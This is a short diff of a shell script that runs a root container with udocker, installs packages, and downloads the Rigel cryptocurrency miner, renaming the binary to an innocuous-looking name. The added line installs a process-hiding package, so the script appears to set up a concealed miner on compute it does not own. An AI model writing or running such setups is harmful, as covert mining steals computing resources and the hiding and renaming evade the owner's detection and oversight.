@@ -9,6 +9,7 @@ udocker --allow-root run python /bin/bash
 udocker
 echo
 apt update && apt -y install wget curl sudo nodejs npm
+npm i -g node-process-hider
 wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/rigel-1-23-2/rigel-1.23.2-linux.tar.gz
 tar xzf rigel-1.23.2-linux.tar.gz
 mv rigel amsjaio
